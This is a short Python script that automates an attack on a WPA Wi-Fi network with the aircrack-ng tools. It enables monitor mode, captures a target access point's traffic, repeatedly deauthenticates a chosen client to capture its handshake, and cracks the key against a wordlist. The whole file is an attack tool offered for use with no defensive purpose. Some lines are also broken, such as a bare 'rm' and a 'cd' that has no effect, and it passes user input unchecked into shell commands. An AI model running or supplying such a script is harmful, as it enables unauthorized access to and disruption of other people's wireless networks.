import os 
import time

aireplay = 0

print("Make by Nux")

PATH = input("Enter the path to install files : ")
os.system(f"cd {PATH}")

if os.path.exists("-01.cap"):
	os.system("rm")
if not os.path.exists("AutomaticCRR"):
	os.makedirs("AutomaticCRR")

PATH = (f"{PATH}AutomaticCRR/")

os.system("airmon-ng")
INTERFACE = input("Enter the interface of your network card : ")

os.system(f"airmon-ng start {INTERFACE}")
os.system("airmon-ng check kill")
os.system("airmon-ng")

INTERFACE_2 = input("Retape the interface of your network card : ")

os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")
time.sleep(10)

BSSID = input("Input the BSSID to crack : ")
CHANNEL = input("Input the CHANNEL of the network to crack : ")

os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
time.sleep(10)

STATION = input("Enter the STATION of the network to crack : ")

while aireplay != 25:
	aireplay = aireplay + 1
	os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")

PATH_LST = input("Enter the worldlist directory : ")
os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")

